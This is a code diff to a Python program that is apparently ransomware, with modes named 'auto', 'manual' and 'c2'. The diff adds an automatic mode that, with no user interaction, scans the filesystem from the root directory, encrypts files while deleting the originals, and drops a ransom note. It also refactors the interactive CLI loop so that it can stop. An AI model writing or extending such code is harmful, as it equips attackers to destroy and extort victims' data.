@@ -8,6 +8,7 @@ class Program():
         self.__criptography: CryptoGraphy = None
         self.__directories_with_files = []
         self.__found_files = []
+        self.__should_cli_run = True
         if data is not None:
             self.__found_files = data.get("found_files", [])
             self.__directories_with_files = data.get("directories_with_files", [])
@@ -55,16 +56,21 @@ class Program():
         print("USE AT YOUR OWN RISK!\n")
 
     def __change_mode(self, new_mode = "manual"):
-        self.__mode__ = new_mode
         print(f"Mode changed to {self.__mode__}")
         match self.__mode__:
             case "auto":
                 print("Auto mode selected. The program will run without user interaction.")
+                self.__should_cli_run = False
+                self.__auto_mode()
             case "c2":
                 print("C2 mode selected. The program will attempt to connect to a command and control server.")
             case "manual":
                 print("Manual mode selected. The program will wait for user input.")
+                if self.__mode__ != new_mode:
+                    self.__cli()
 
+        self.__mode__ = new_mode
+    
     def __envcheck(self):
         import platform
 
@@ -165,7 +171,7 @@ class Program():
             os.remove("discovered_info.json")
 
     def __cli(self):
-        while True:
+        while self.__should_cli_run:
             inp = input("MyCLI> ").strip()
             command = inp.split()[0]
 
@@ -221,6 +227,13 @@ class Program():
 
                 case _:
                     print(f"Unknown command: {command}")
+
+    def __auto_mode(self):
+        self.__envcheck()
+        self.__directory(start_path="/")
+        self.__setup(should_encrypt=True, should_delete_original=True)
+        self.__encrypt()
+        self.__ransomnote()
 
     def load_key(self, key_filename: str = "secret.key"):
         if self.__criptography is None:
